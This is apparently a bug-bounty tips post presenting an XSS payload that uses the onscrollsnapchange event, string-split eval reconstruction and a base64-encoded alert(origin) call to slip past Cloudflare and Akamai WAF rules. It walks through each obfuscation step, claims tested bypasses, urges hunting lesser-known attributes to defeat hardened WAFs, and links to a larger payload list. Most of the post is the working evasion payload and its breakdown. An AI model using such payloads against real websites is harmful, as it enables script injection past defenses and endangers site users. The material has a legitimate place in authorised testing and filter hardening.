## 🚨 New WAF Bypass for Akamai & Cloudflare

### 🛡 XSS Payload via `onscrollsnapchange` + Obfuscation

Researchers found a new way to bypass some WAF rules using the obscure `onscrollsnapchange` event in combination with obfuscated `eval` logic.

### 💥 Payload:

```html
<address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])]
(window['a'+'to'+(['b','c','d'][0])]('YWxlcnQob3JpZ2luKQ=='));
style=overflow-y:hidden;scroll-snap-type:x>
<div style=scroll-snap-align:center>1337</div></address>
```

### 🔍 How It Works:

* `onscrollsnapchange` is rarely filtered and often overlooked by WAFs.
* `eval` is split and dynamically reconstructed: `['l','b','c'][0] = 'l'` → `eval`.
* Base64 payload `YWxlcnQob3JpZ2luKQ==` decodes to `alert(origin)`.
* Scroll and display styles help it render smoothly, evading suspicion.

### ✅ Tested Bypasses:

* Cloudflare (standard security settings)
* Akamai WAF profiles

### 💡 Pro Tip:

Explore lesser-known HTML/JS attributes + obfuscation strategies to bypass hardened WAFs. This combo is effective for finding edge-case vulnerabilities.

---

🔔 Follow **@cybersecplayground** for more cutting-edge bypasses, CVE drops, and recon techniques.

🔗 View more XSS payloads: [XSS\_Payload.txt](https://github.com/cybersecplayground/bugbounty-Tips-and-Tricks/blob/main/Payloads/XSS_Payload.txt)

---

\#xss #wafbypass #akamai #cloudflare #bugbountytips #cybersec #infosec #cybersecplayground
